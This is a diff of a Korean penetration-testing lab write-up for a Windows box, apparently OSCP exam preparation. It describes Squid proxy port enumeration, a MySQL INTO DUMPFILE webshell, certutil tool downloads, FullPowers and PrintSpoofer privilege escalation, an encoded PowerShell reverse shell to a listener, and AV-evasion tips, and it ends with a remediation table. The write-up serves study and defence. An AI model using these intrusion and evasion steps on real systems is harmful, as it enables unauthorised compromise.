-> **`dir C:\` 한 번**이면 나온다. (`Get-ChildItem C:\ -Recurse`는 리버스셸을 몇 분간 블로킹시키므로 쓰지 말 것)
+`local.txt`가 `C:\` 루트에 있다. `C:\Users\`에는 `Administrator`와 `Public`뿐이고 일반 유저 계정이 없다. `C:\Users\*\Desktop\local.txt` 패턴으로 찾으면 영원히 못 찾는다. `dir C:\` 한 번이면 나온다(`Get-ChildItem C:\ -Recurse`는 리버스셸을 몇 분간 블로킹시키므로 쓰지 말 것).
 
-> [!tip] 시험 증거 형식 연습 — Windows 판
-> 리눅스의 `whoami; hostname; ip a; cat /root/proof.txt`에 대응하는 것:
-> ```powershell
-> whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
-> ```
-> **한 화면에** 담겨야 인정된다. PowerShell에서는 `;`로 이어 붙이면 되고, `cmd.exe`라면 `&`를 쓴다.
-> `ip a`가 아니라 **`ipconfig`** 다 — Windows 박스에서 반사적으로 `ip a`를 치면 `명령을 찾을 수 없습니다`가 나온다.
+시험 증거 형식은 Windows 판으로 연습한다. 리눅스의 `whoami; hostname; ip a; cat /root/proof.txt`에 대응하는 것:
+```powershell
+whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
+```
+한 화면에 담겨야 인정된다. PowerShell에서는 `;`로 이어 붙이면 되고, `cmd.exe`라면 `&`를 쓴다. `ip a`가 아니라 `ipconfig`다 — Windows 박스에서 반사적으로 `ip a`를 치면 `명령을 찾을 수 없습니다`가 나온다.
 
 ---
 
@@ -925,18 +846,18 @@ CertUtil: -URLCache command completed successfully.
 
 **"성공"이라고 뜨는데 파일이 없다.** 이름을 바꾸면서 **절대경로**(`C:\Users\Public\ps.exe`)를 함께 준 뒤에야 정상 저장됐다.
 
-> [!note] 진짜 원인은 AV가 아니라 `certutil`의 조용한 실패였다
-> 당시 이 실패를 "파일명 시그니처 탐지"로 적었으나, 이는 **오귀인**이다. 근거:
-> - Defender에 "파일명 시그니처"라는 탐지 기전은 **없다**(탐지는 내용·행위·ML 기반, 파일명은 *제외 목록*에서만 쓰인다). 게다가 관측된 `RealTimeProtectionEnabled=False`는 쓰기 시점 스캔이 일어나지 않았다는 뜻이라 **자기 결론을 반박**한다.
-> - PrintSpoofer는 실제로 **내용 기반**으로 탐지된다(`HackTool:Win64/PrintSpoofer!MTB`). 내용 기반이면 이름만 바꿔서는 회피되지 않는다 — "이름을 바꾸니 됐다"는 인과가 아니라 상관이었다.
-> - `certutil -urlcache -f`는 **대상 경로에 쓸 수 없을 때도 "완료" 배너와 exit 0을 반환**한다(내부적으로 URL 캐시 표시 모드로 조용히 떨어진다). 웹셸(Apache LOCAL SERVICE) 컨텍스트의 CWD는 대개 쓰기 불가라, 상대 파일명이 그리로 해석돼 사라진 것이다. **이름 변경이 아니라 절대경로 지정이 실제 해결**이었다.
-> - 진짜 HTTP 실패는 시끄럽다 — 404는 `0x80190194 (HTTP_E_STATUS_NOT_FOUND)`에 음수 exit로 떨어진다. 조용한 성공은 경로 문제의 신호다.
-> - 부수 확인: `certutil`에 `-split`은 파일 저장에 **불필요**하다(흔한 오해). 있으나 없으나 동일하게 저장된다.
+진짜 원인은 AV가 아니라 `certutil`의 조용한 실패였다. 당시 이 실패를 "파일명 시그니처 탐지"로 적었으나, 이는 오귀인이다. 근거:
 
-**어떻게 알아챘는가**: 다운로드 직후 `dir C:\Users\Public`을 쳐서 파일이 없다는 것을 확인했다. 이 습관이 없었다면 "PrintSpoofer가 안 먹는다"고 오진하고 **다른 권한상승 경로를 뒤지느라 시간을 통째로 날렸을 것**이다. 원인이 AV가 아니라 경로였다는 점에서, **"성공 메시지를 믿지 말고 쓰기 가능한 절대경로를 주고 `dir`로 확인하라"는 상위 교훈은 오히려 더 강해진다.**
+- Defender에 "파일명 시그니처"라는 탐지 기전은 **없다**(탐지는 내용·행위·ML 기반, 파일명은 *제외 목록*에서만 쓰인다). 게다가 관측된 `RealTimeProtectionEnabled=False`는 쓰기 시점 스캔이 일어나지 않았다는 뜻이라 자기 결론을 반박한다.
+- PrintSpoofer는 실제로 내용 기반으로 탐지된다(`HackTool:Win64/PrintSpoofer!MTB`). 내용 기반이면 이름만 바꿔서는 회피되지 않는다 — "이름을 바꾸니 됐다"는 인과가 아니라 상관이었다.
+- `certutil -urlcache -f`는 **대상 경로에 쓸 수 없을 때도 "완료" 배너와 exit 0을 반환**한다(내부적으로 URL 캐시 표시 모드로 조용히 떨어진다). 웹셸(Apache LOCAL SERVICE) 컨텍스트의 CWD는 대개 쓰기 불가라, 상대 파일명이 그리로 해석돼 사라진 것이다. **이름 변경이 아니라 절대경로 지정이 실제 해결**이었다.
+- 진짜 HTTP 실패는 시끄럽다 — 404는 `0x80190194 (HTTP_E_STATUS_NOT_FOUND)`에 음수 exit로 떨어진다. 조용한 성공은 경로 문제의 신호다.
+- 부수 확인: `certutil`에 `-split`은 파일 저장에 불필요하다(흔한 오해). 있으나 없으나 동일하게 저장된다.
+
+**어떻게 알아챘는가**: 다운로드 직후 `dir C:\Users\Public`을 쳐서 파일이 없다는 것을 확인했다. 이 습관이 없었다면 "PrintSpoofer가 안 먹는다"고 오진하고 다른 권한상승 경로를 뒤지느라 시간을 통째로 날렸을 것이다. 원인이 AV가 아니라 경로였다는 점에서, "성공 메시지를 믿지 말고 쓰기 가능한 절대경로를 주고 `dir`로 확인하라"는 상위 교훈은 오히려 더 강해진다.
 
 > [!danger] 다운로드 "성공" 메시지를 믿지 말고 `dir`로 확인하라
-> 다운로드 도구는 **경로 문제로 쓰기에 실패해도**(certutil이 대표적) 성공을 반환하고, AV/EDR이 파일을 조용히 삭제해도 마찬가지다. **전송 후 항상 존재 여부를 확인**하고, 안 보이면 **쓰기 가능한 절대경로부터 바로잡고** 그다음 파일명을 바꿔본다.
+> 다운로드 도구는 **경로 문제로 쓰기에 실패해도**(certutil이 대표적) 성공을 반환하고, AV/EDR이 파일을 조용히 삭제해도 마찬가지다. 전송 후 항상 존재 여부를 확인하고, 안 보이면 **쓰기 가능한 절대경로부터 바로잡고** 그다음 파일명을 바꿔본다.
 > 전송 후 체크리스트:
 > ```cmd
 > dir C:\Users\Public\fp.exe          ← 존재하는가
@@ -957,22 +878,17 @@ CertUtil: -URLCache command completed successfully.
 
 **시간 손실 지점**: 403이 무더기로 나오면 "차단됐다 = 없다"로 읽기 쉽다. `X-Squid-Error` 헤더를 확인하고 나서야 `ERR_ACCESS_DENIED`(ACL)와 `ERR_CONNECT_FAIL`(닫힘)이 **완전히 다른 사건**임을 확정했다.
 
-> [!warning] 보고서에는 커버리지 한계를 명시하라
-> "1-1024 포트는 Squid ACL로 인해 열거하지 못했다"를 **적어야** 한다. 안 적으면 "스캔 결과 없음"으로 읽혀 오탐/미탐의 책임이 커진다.
-> 시험 리포트에서도 동일하다 — **확인한 것과 확인하지 못한 것을 구분해 쓴다.**
+보고서에는 커버리지 한계를 명시하라. "1-1024 포트는 Squid ACL로 인해 열거하지 못했다"를 적어야 한다. 안 적으면 "스캔 결과 없음"으로 읽혀 오탐/미탐의 책임이 커진다. 시험 리포트에서도 동일하다 — 확인한 것과 확인하지 못한 것을 구분해 쓴다.
 
-> [!note] 이 노트가 스스로 모순됐던 지점 — 교훈
-> §2-2 danger 박스는 "타임아웃은 필터링이지 닫힘이 아니다"라고 옳게 경고해 놓고, 정작 판별 요약표에서는 `503=닫힘`으로 단정해 그 구분을 지웠다(위에서 정정함). 두 서술이 충돌했다. 루프백(`127.0.0.1`) 대상에서만 `503=닫힘`이 실질적으로 성립하기 때문에 이 박스에서는 드러나지 않았을 뿐이다. **danger 박스가 세운 원칙을 요약표가 배신하지 않는지 스스로 검산하라** — 요약이 원문 경고를 무너뜨리는 것이 흔한 자기모순이다.
+이 노트가 스스로 모순됐던 지점도 남겨둔다. §2-2 본문은 "타임아웃은 필터링이지 닫힘이 아니다"라고 옳게 경고해 놓고, 정작 판별 요약표에서는 `503=닫힘`으로 단정해 그 구분을 지웠다(위에서 정정함). 두 서술이 충돌했다. 루프백(`127.0.0.1`) 대상에서만 `503=닫힘`이 실질적으로 성립하기 때문에 이 박스에서는 드러나지 않았을 뿐이다. **본문 경고가 세운 원칙을 요약표가 배신하지 않는지 스스로 검산하라** — 요약이 원문 경고를 무너뜨리는 것이 흔한 자기모순이다.
 
 ### ③ gobuster가 프록시 경유로 완주하지 못했다
 
 `directory-list-2.3-medium.txt`(22만 라인)를 프록시로 밀었더니 300초 제한에 걸려 **미완주**했다. 프록시 왕복이 요청당 수백 ms라 대규모 워드리스트는 구조적으로 불가능하다.
 
-**탈출구는 열거 방식 전환이었다.** WampServer 홈페이지가 이미 `Your Aliases: adminer phpmyadmin phpsysinfo`를 알려줬으므로, 무차별 열거 대신 **타겟형 프로브**로 바꾸니 `/adminer`·`/phpsysinfo`·`/wampthemes`·`/testmysql.php`가 전부 한 번에 적중했다.
+**탈출구는 열거 방식 전환이었다.** WampServer 홈페이지가 이미 `Your Aliases: adminer phpmyadmin phpsysinfo`를 알려줬으므로, 무차별 열거 대신 타겟형 프로브로 바꾸니 `/adminer`·`/phpsysinfo`·`/wampthemes`·`/testmysql.php`가 전부 한 번에 적중했다.
 
-> [!tip] 애플리케이션이 스스로 말해주는 경로를 먼저 읽어라
-> 무차별 디렉터리 열거는 **정보가 없을 때의 최후 수단**이다. 홈페이지·`robots.txt`·JS 번들·에러 페이지·`sitemap.xml`이 경로를 직접 알려주는 경우가 훨씬 흔하다.
-> 특히 **프록시·VPN 경유로 느린 링크**에서는 워드리스트 크기를 `common.txt`(4600줄) 수준으로 줄이거나 아예 타겟형으로 전환한다.
+무차별 디렉터리 열거는 정보가 없을 때의 최후 수단이다. 홈페이지·`robots.txt`·JS 번들·에러 페이지·`sitemap.xml`이 경로를 직접 알려주는 경우가 훨씬 흔하다. 특히 프록시·VPN 경유로 느린 링크에서는 워드리스트 크기를 `common.txt`(4600줄) 수준으로 줄이거나 아예 타겟형으로 전환한다.
 
 ### ④ MariaDB 3307 — 설정에 적혀 있다고 떠 있는 게 아니다
 
@@ -986,12 +902,12 @@ phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. �
 
 해결: **로그인 응답 본문에서 새 토큰을 다시 파싱**해서 그 다음 요청에 쓴다.
 
-> [!warning] 웹앱 자동화의 3대 함정
-> 1. **CSRF 토큰이 매 요청 갱신** ← 이 박스
-> 2. **세션 쿠키를 유지하지 않음** (`requests.Session` 필수)
-> 3. **환경변수 프록시가 끼어듦** (`trust_env=False` 필수) ← 이 박스
->
-> 셋 다 **에러가 아니라 "엉뚱한 페이지"** 로 나타나서 원인 찾기가 오래 걸린다. 자동화가 이상하면 **응답 본문을 통째로 저장해서 눈으로 봐라.**
+웹앱 자동화의 3대 함정은 다음이다.
+1. CSRF 토큰이 매 요청 갱신 ← 이 박스
+2. 세션 쿠키를 유지하지 않음 (`requests.Session` 필수)
+3. 환경변수 프록시가 끼어듦 (`trust_env=False` 필수) ← 이 박스
+
+셋 다 에러가 아니라 "엉뚱한 페이지"로 나타나서 원인 찾기가 오래 걸린다. 자동화가 이상하면 **응답 본문을 통째로 저장해서 눈으로 봐라.**
 
 ### ⑥ 인용 4중 중첩 — 배치 파일로 빼서 해결
 
@@ -1005,9 +921,7 @@ phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. �
 
 해결: `-c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1"` 처럼 **파일로 리다이렉트**하고 따로 읽는다. `2>&1`을 빼면 실패 원인이 담긴 표준에러를 놓친다.
 
-> [!tip] 비대화형 컨텍스트의 기본 반사
-> 웹셸·예약 작업·서비스·`CreateProcessAsUser`로 만든 프로세스는 **전부 출력이 안 온다**고 가정하라.
-> 항상 `> C:\Users\Public\out.txt 2>&1`을 붙이고, 그다음 `type out.txt`로 읽는다.
+웹셸·예약 작업·서비스·`CreateProcessAsUser`로 만든 프로세스는 전부 출력이 안 온다고 가정하라. 항상 `> C:\Users\Public\out.txt 2>&1`을 붙이고, 그다음 `type out.txt`로 읽는다.
 
 ### ⑧ 플래그가 표준 위치에 없었다 + `-Recurse` 함정
 
@@ -1037,8 +951,7 @@ phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. �
 | 리버스셸이 안 붙는다 | 아웃바운드 포트 제한 | **443·80·53**을 시도. ([[Hawat]]에서 실제로 443만 열려 있었다) |
 | FullPowers가 예약 작업 생성 실패 | 계정이 `LOCAL/NETWORK SERVICE`가 아님 | `whoami` 재확인. IIS AppPool 계정은 FullPowers 대상이 아니다 |
 
-> [!note] [가정] 리버스셸 포트를 443 → 4444로 바꾼 흔적이 있다 — 위 "리버스셸이 안 붙는다" 행은 실측이었을 수 있다
-> 산출물 타임라인이 이 마찰을 **실제로 겪었을 가능성**을 시사한다: `revgen.py`(LHOST:PORT=192.168.45.207:**443**, Aug19 18:32) → FullPowers 다운로드(18:36) → `revgen4444.py`(…:**4444**, 18:38). 443으로 먼저 만들었다가 4444로 바꾼 순서다. 443 시도의 결과 기록은 노트·Kali 어디에도 없어 **왜 바꿨는지는 확증할 수 없다**(타임스탬프 기반 추론). 최종 성공 리버스셸이 4444인 것과는 일치한다.
+[가정] 리버스셸 포트를 443 → 4444로 바꾼 흔적이 있다 — 위 "리버스셸이 안 붙는다" 행은 실측이었을 수 있다. 산출물 타임라인이 이 마찰을 실제로 겪었을 가능성을 시사한다: `revgen.py`(LHOST:PORT=192.168.45.207:**443**, Aug19 18:32) → FullPowers 다운로드(18:36) → `revgen4444.py`(…:**4444**, 18:38). 443으로 먼저 만들었다가 4444로 바꾼 순서다. 443 시도의 결과 기록은 노트·Kali 어디에도 없어 왜 바꿨는지는 확증할 수 없다(타임스탬프 기반 추론). 최종 성공 리버스셸이 4444인 것과는 일치한다.
 
 ### ⑩ 버린 경로 — 외부에 열린 SMB/RPC를 왜 파지 않았는가
 
@@ -1052,16 +965,11 @@ phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. �
 
 | 신호 | 읽는 법 | 이 박스에서의 결론 |
 |---|---|---|
-| `Message signing ... not required` | **NTLM 릴레이가 이론상 가능**하다는 뜻 | 릴레이는 **"인증을 흘려보낼 다른 호스트"** 가 있어야 성립한다. 단독 호스트 랩에서는 쓸 곳이 없다 |
-| 445 open, 자격증명 없음 | 익명 세션(`-N`)으로 공유 목록·사용자 열거 시도 가능 | Server 2019는 기본적으로 **익명 열거를 차단**한다. [가정] 실측 기록은 없으나, 프록시 경로가 이미 열려 있었으므로 여기에 시간을 쓸 이유가 없었다 |
-| 49666/49667 (동적 RPC) | RPC 엔드포인트 매퍼가 넘겨준 고번호 포트 | 자격증명 없이는 대부분 접근 거부. **135가 열려 있으면 항상 따라 붙는 부산물**이고 그 자체가 단서가 아니다 |
+| `Message signing ... not required` | NTLM 릴레이가 이론상 가능하다는 뜻 | 릴레이는 "인증을 흘려보낼 다른 호스트"가 있어야 성립한다. 단독 호스트 랩에서는 쓸 곳이 없다 |
+| 445 open, 자격증명 없음 | 익명 세션(`-N`)으로 공유 목록·사용자 열거 시도 가능 | Server 2019는 기본적으로 익명 열거를 차단한다. [가정] 실측 기록은 없으나, 프록시 경로가 이미 열려 있었으므로 여기에 시간을 쓸 이유가 없었다 |
+| 49666/49667 (동적 RPC) | RPC 엔드포인트 매퍼가 넘겨준 고번호 포트 | 자격증명 없이는 대부분 접근 거부. 135가 열려 있으면 항상 따라 붙는 부산물이고 그 자체가 단서가 아니다 |
 
-> [!tip] "열려 있다"와 "쓸 수 있다"를 구분하라 — 시간 배분의 핵심
-> 시험장에서 가장 비싼 실수는 **막다른 포트를 오래 파는 것**이다. 판단 기준은 하나다 — **"지금 내가 가진 것으로 이 포트를 진전시킬 수 있는가?"**
-> - 자격증명 없음 + SMB → **거의 항상 막다른 길**이다. 익명 열거가 열려 있는 구버전이 아니면 15분 안에 접는다
-> - 반면 프록시·웹은 **자격증명 없이도 진전이 가능**한 표면이다. 우선순위가 훨씬 높다
->
-> 이 박스에서 3128을 먼저 판 것이 정답이었고, 그 판단의 근거는 "SMB로는 지금 할 수 있는 게 없다"는 **소거법**이었다.
+시험장에서 가장 비싼 실수는 막다른 포트를 오래 파는 것이다. 판단 기준은 하나다 — **"지금 내가 가진 것으로 이 포트를 진전시킬 수 있는가?"** 자격증명 없음 + SMB는 거의 항상 막다른 길이다(익명 열거가 열려 있는 구버전이 아니면 15분 안에 접는다). 반면 프록시·웹은 자격증명 없이도 진전이 가능한 표면이라 우선순위가 훨씬 높다. 이 박스에서 3128을 먼저 판 것이 정답이었고, 그 판단의 근거는 "SMB로는 지금 할 수 있는 게 없다"는 소거법이었다.
 
 ### ⑪ 시간 배분 — 어디서 손절했어야 하는가
 
@@ -1083,22 +991,22 @@ phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. �
 
 ## 7. OSCP 시험 관점
 
-1. **오픈 프록시는 공격면이 아니라 통로다.** 외부 스캔에서 웹 포트가 3128 하나뿐이라 막힌 것처럼 보이지만, 프록시 뒤에 MySQL·WinRM·WampServer가 전부 있었다. **프록시를 만나면 내부 포트 열거가 첫 수순**이다. 목적지는 반드시 **`127.0.0.1`**로 — 루프백 전용 바인드를 잡기 위해서다.
-2. **판별 기준을 손으로 이해하고 있어라.** `503 ERR_CONNECT_FAIL`=연결 실패(닫힘 또는 필터링, 본문 `The system returned:` 줄로 구분 — 루프백 대상에선 사실상 닫힘), 그 외=열림, `403 ERR_ACCESS_DENIED`=ACL 차단(판별 불가). 도구(`spose`)가 오판할 때 직접 확인할 수 있어야 한다. **수동 대안은 `curl -x`로 503/000을 걸러내는 한 줄짜리 스크립트**(`pscan.sh`/`psweep.sh`)이고, 이 박스에서 실제로 쓴 것도 그것이다.
-3. **`CONNECT` 가능 여부를 먼저 확인하라.** 열려 있으면 프록시가 **범용 TCP 터널**이 되어 `proxychains`로 nmap·evil-winrm·mysql 클라이언트를 그대로 밀어 넣을 수 있다. 막혀 있으면 **HTTP로 표현 가능한 공격만** 남는다 — 이 제약이 공격 계획 전체를 결정한다.
-4. **MySQL 파일 쓰기 전에 `@@secure_file_priv`를 확인한다.** `NULL`=차단, 빈 문자열=무제한, 경로=그 안에서만. 이걸 안 보고 페이로드를 던지면 실패 원인을 모른다. 단 [[Hawat]]처럼 **변수값과 실측이 어긋날 수 있으니 마커 파일 쓰기가 최종 근거**다.
-5. **`INTO DUMPFILE`이 `INTO OUTFILE`보다 맞다.** `OUTFILE`은 구분자를 삽입해 정확한 바이트열을 깨뜨린다. 페이로드는 **hex 리터럴**로 넘겨 인용 계층을 통과시킨다. 둘 다 **기존 파일을 덮어쓰지 못한다**는 것도 함께 기억한다.
-6. **Windows 셸을 잡으면 `whoami /priv`가 1번 명령이다.** 리눅스의 `id`·`sudo -l`에 해당한다. 개수가 아니라 **위험 특권(`SeImpersonate`·`SeDebug`·`SeBackup`·`SeRestore`·`SeTakeOwnership`·`SeLoadDriver`)이 있는지**를 본다.
-7. **`SeImpersonatePrivilege`를 보면 Potato다.** build 17763(Server 2019/Win10 1809) 이상이면 **JuicyPotato는 죽었다.** `sc query spooler`로 Spooler가 살아 있으면 **PrintSpoofer**, 꺼져 있으면 EfsPotato/GodPotato, 그것도 안 되면 RoguePotato(아웃바운드 135 필요).
-8. **`LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다.** `whoami /priv`가 3개뿐이어도 **FullPowers**로 7개(=`SeImpersonate` 포함)를 되찾을 수 있다. 원리는 **작업 스케줄러가 SCM의 특권 축소를 적용하지 않는다**는 것. 이걸 모르면 PrintSpoofer 단계까지 못 간다.
-9. **다운로드 "성공"을 믿지 말고 `dir`로 확인한다.** `certutil`은 **대상 경로에 못 쓰면 성공 배너와 exit 0을 반환**하고 조용히 실패한다 — 항상 **쓰기 가능한 절대경로**를 주고 `dir`로 검증한다. (내용 기반 탐지에 걸릴 때는 파일명·페이로드도 바꾼다.) 회피 순서는 **경로 → 파일명 → 전송수단 → 페이로드**.
-10. **인용이 중첩되면 인코딩으로 도망간다.** SQL은 **hex 리터럴**(`0x3c3f...`), PowerShell은 **`-enc` UTF-16LE base64**, `cmd` 중첩은 **배치 파일**. 이 박스에 세 가지가 전부 나온다.
+1. **오픈 프록시는 공격면이 아니라 통로다.** 외부 스캔에서 웹 포트가 3128 하나뿐이라 막힌 것처럼 보이지만, 프록시 뒤에 MySQL·WinRM·WampServer가 전부 있었다. 프록시를 만나면 내부 포트 열거가 첫 수순이다. 목적지는 반드시 `127.0.0.1`로 — 루프백 전용 바인드를 잡기 위해서다.
+2. **판별 기준을 손으로 이해하고 있어라.** `503 ERR_CONNECT_FAIL`=연결 실패(닫힘 또는 필터링, 본문 `The system returned:` 줄로 구분 — 루프백 대상에선 사실상 닫힘), 그 외=열림, `403 ERR_ACCESS_DENIED`=ACL 차단(판별 불가). 도구(`spose`)가 오판할 때 직접 확인할 수 있어야 한다. 수동 대안은 `curl -x`로 503/000을 걸러내는 한 줄짜리 스크립트(`pscan.sh`/`psweep.sh`)이고, 이 박스에서 실제로 쓴 것도 그것이다.
+3. **`CONNECT` 가능 여부를 먼저 확인하라.** 열려 있으면 프록시가 범용 TCP 터널이 되어 `proxychains`로 nmap·evil-winrm·mysql 클라이언트를 그대로 밀어 넣을 수 있다. 막혀 있으면 HTTP로 표현 가능한 공격만 남는다 — 이 제약이 공격 계획 전체를 결정한다.
+4. **MySQL 파일 쓰기 전에 `@@secure_file_priv`를 확인한다.** `NULL`=차단, 빈 문자열=무제한, 경로=그 안에서만. 이걸 안 보고 페이로드를 던지면 실패 원인을 모른다. 단 [[Hawat]]처럼 변수값과 실측이 어긋날 수 있으니 마커 파일 쓰기가 최종 근거다.
+5. **`INTO DUMPFILE`이 `INTO OUTFILE`보다 맞다.** `OUTFILE`은 구분자를 삽입해 정확한 바이트열을 깨뜨린다. 페이로드는 hex 리터럴로 넘겨 인용 계층을 통과시킨다. 둘 다 기존 파일을 덮어쓰지 못한다는 것도 함께 기억한다.
+6. **Windows 셸을 잡으면 `whoami /priv`가 1번 명령이다.** 리눅스의 `id`·`sudo -l`에 해당한다. 개수가 아니라 위험 특권(`SeImpersonate`·`SeDebug`·`SeBackup`·`SeRestore`·`SeTakeOwnership`·`SeLoadDriver`)이 있는지를 본다.
+7. **`SeImpersonatePrivilege`를 보면 Potato다.** build 17763(Server 2019/Win10 1809) 이상이면 JuicyPotato는 죽었다. `sc query spooler`로 Spooler가 살아 있으면 PrintSpoofer, 꺼져 있으면 EfsPotato/GodPotato, 그것도 안 되면 RoguePotato(아웃바운드 135 필요).
+8. **`LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다.** `whoami /priv`가 3개뿐이어도 FullPowers로 7개(=`SeImpersonate` 포함)를 되찾을 수 있다. 원리는 작업 스케줄러가 SCM의 특권 축소를 적용하지 않는다는 것. 이걸 모르면 PrintSpoofer 단계까지 못 간다.
+9. **다운로드 "성공"을 믿지 말고 `dir`로 확인한다.** `certutil`은 대상 경로에 못 쓰면 성공 배너와 exit 0을 반환하고 조용히 실패한다 — 항상 쓰기 가능한 절대경로를 주고 `dir`로 검증한다. (내용 기반 탐지에 걸릴 때는 파일명·페이로드도 바꾼다.) 회피 순서는 경로 → 파일명 → 전송수단 → 페이로드.
+10. **인용이 중첩되면 인코딩으로 도망간다.** SQL은 hex 리터럴(`0x3c3f...`), PowerShell은 `-enc` UTF-16LE base64, `cmd` 중첩은 배치 파일. 이 박스에 세 가지가 전부 나온다.
 11. **`powershell -enc`의 base64는 UTF-16LE다.** `iconv -t UTF-16LE`를 빼면 무조건 실패한다. 리눅스 습관으로 `base64 -w0`만 치면 시간을 태운다.
-12. **Windows에는 TTY 업그레이드가 없다.** `python3 -c 'import pty'`·`script -qc`는 해당 없다. 대신 **웹셸은 상태가 없다**고 가정하고 절대경로로 명령을 조립하며, 필요하면 `cmd /c "A && B"`로 묶는다. 대화형이 꼭 필요하면 리버스셸을 올리고 `rlwrap`을 리스너 쪽에 건다.
+12. **Windows에는 TTY 업그레이드가 없다.** `python3 -c 'import pty'`·`script -qc`는 해당 없다. 대신 웹셸은 상태가 없다고 가정하고 절대경로로 명령을 조립하며, 필요하면 `cmd /c "A && B"`로 묶는다. 대화형이 꼭 필요하면 리버스셸을 올리고 `rlwrap`을 리스너 쪽에 건다.
 13. **비대화형 컨텍스트의 출력은 파일로 받는다.** `> C:\Users\Public\out.txt 2>&1` → `type out.txt`. `2>&1`을 빼면 실패 원인을 놓친다.
-14. **플래그가 표준 위치에 없을 수 있다.** 여기서는 `C:\local.txt`. `C:\Users\*\Desktop\` 패턴에만 의존하지 말고 **`dir C:\`를 먼저** 본다. `-Recurse`는 셸을 몇 분간 블로킹시키니 피하고 `where /r`·`dir /s /b`를 쓴다.
-15. **⚠️ 시험 금지 도구 관점 — 이 박스는 통과다.** 세 도구의 지위는 **서로 다르다**: **sqlmap = 명시적 금지**(Exam Restrictions에 이름이 있다), **metasploit = 금지가 아니라 "1대 제한"**(최초 사용 대상에 고정·피벗 불가, 단 `msfvenom`/`multi_handler`는 전 대상 허용), **AutoRecon = 규정에 언급 없음 = 허용**(단 내부에서 금지 도구를 호출하지 않는지는 응시자 책임). 이 박스는 셋 다 쓰지 않았다. 자동 도구를 쓴 유일한 후보는 `spose.py`(프록시 포트 스캐너)인데 **실제로는 `curl` 스크립트로 대체했다.** PrintSpoofer·FullPowers는 **단독 익스플로잇 바이너리**라 metasploit 제한과 무관하다. `msfvenom`으로 페이로드를 만드는 것도 허용이지만, 여기서는 `powershell -enc` 원라이너면 충분했다 — **AV 회피 관점에서도 msfvenom 산출물보다 낫다.**
-16. **증거 스크린샷은 `ipconfig`다.** `ip a`가 아니다. `whoami; hostname; ipconfig; type <flag>`를 **한 화면에** 담는다.
+14. **플래그가 표준 위치에 없을 수 있다.** 여기서는 `C:\local.txt`. `C:\Users\*\Desktop\` 패턴에만 의존하지 말고 `dir C:\`를 먼저 본다. `-Recurse`는 셸을 몇 분간 블로킹시키니 피하고 `where /r`·`dir /s /b`를 쓴다.
+15. **⚠️ 시험 금지 도구 관점 — 이 박스는 통과다.** 세 도구의 지위는 서로 다르다: sqlmap = 명시적 금지(Exam Restrictions에 이름이 있다), metasploit = 금지가 아니라 "1대 제한"(최초 사용 대상에 고정·피벗 불가, 단 `msfvenom`/`multi_handler`는 전 대상 허용), AutoRecon = 규정에 언급 없음 = 허용(단 내부에서 금지 도구를 호출하지 않는지는 응시자 책임). 이 박스는 셋 다 쓰지 않았다. 자동 도구를 쓴 유일한 후보는 `spose.py`(프록시 포트 스캐너)인데 실제로는 `curl` 스크립트로 대체했다. PrintSpoofer·FullPowers는 단독 익스플로잇 바이너리라 metasploit 제한과 무관하다. `msfvenom`으로 페이로드를 만드는 것도 허용이지만, 여기서는 `powershell -enc` 원라이너면 충분했다 — AV 회피 관점에서도 msfvenom 산출물보다 낫다.
+16. **증거 스크린샷은 `ipconfig`다.** `ip a`가 아니다. `whoami; hostname; ipconfig; type <flag>`를 한 화면에 담는다.
 
 ---
 
@@ -1108,16 +1016,16 @@ phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. �
 |---|---|
 | **Squid 인증·출발지 제한 없는 중계** ([가정] `http_access allow all` 상당 — 설정 덤프 불가로 추정) | `acl localnet src <내부대역>` + `http_access allow localnet` + **`http_access deny all`**. 인증이 필요하면 `proxy_auth`. **이 하나만 고쳤어도 체인 전체가 시작조차 못 한다** |
 | Squid가 `127.0.0.1` 목적지를 중계 | `acl to_localhost dst 127.0.0.0/8` + `http_access deny to_localhost` (기본 설정에 **주석 상태로** 들어 있는 권장 규칙 — **활성화하지 않은 것이 결함**이다. Squid 상류는 이 줄을 `#` 처리해 출하하므로 루프백 중계는 오설정이 아니라 Squid 4의 기본 동작이다). **단 Squid 5.8/6.0.1부터는 이 규칙이 기본 활성으로 바뀌었다** — 버전에 따라 판단이 갈린다 |
-| **MySQL `root` 빈 패스워드** | 강한 패스워드 설정. `mysql_secure_installation` 실행. 애플리케이션은 **최소권한 전용 계정**으로 접속 |
-| **`@@secure_file_priv`가 빈 문자열** | 명시적 디렉터리(또는 `NULL`)로 설정. 애플리케이션 계정에서 **`FILE` 권한 회수** — 파일 쓰기 원시 자체를 제거한다 |
-| mysqld가 웹루트에 쓰기 가능 | 웹루트는 배포 계정만 쓰기, 웹서버·DB 계정은 읽기 전용. **DB 프로세스와 웹루트의 권한 분리** |
-| phpMyAdmin·adminer가 인증 없이 노출 | 관리 도구는 **웹루트에서 제거**하거나 IP 제한·별도 인증(HTTP Basic)·비표준 경로. 운영 서버에 두지 않는 것이 원칙 |
-| **`testmysql.php`·`phpsysinfo` 진단 스크립트 방치** | 배포 시 삭제. `phpsysinfo`는 호스트명·OS 빌드·MAC·디스크까지 **인증 없이** 유출했다 |
-| WampServer 기본 구성 그대로 운영 | 올인원 개발 패키지는 **개발 전용**이다. 운영에는 개별 설치 + 하드닝 |
-| `LOCAL SERVICE`가 `SeImpersonatePrivilege`를 복원 가능 | 근본 차단은 어렵다. **탐지로 보완** — 서비스 계정에 의한 예약 작업 생성(이벤트 4698)과 비정상 명명 파이프 생성을 모니터링 |
-| Print Spooler 실행 중 | 서버에서 인쇄가 불필요하면 **Spooler 서비스 비활성화**. PrintNightmare 계열 전체를 함께 막는다 |
-| **Defender 실시간 보호 비활성** | 재활성화. (이 박스의 certutil 실패는 AV가 아니라 경로 문제였다 — §6① 참조.) 서명 기반만으로는 리네이밍·패커에 뚫리므로 **행위 기반 탐지 + ASR 규칙**이 필요 |
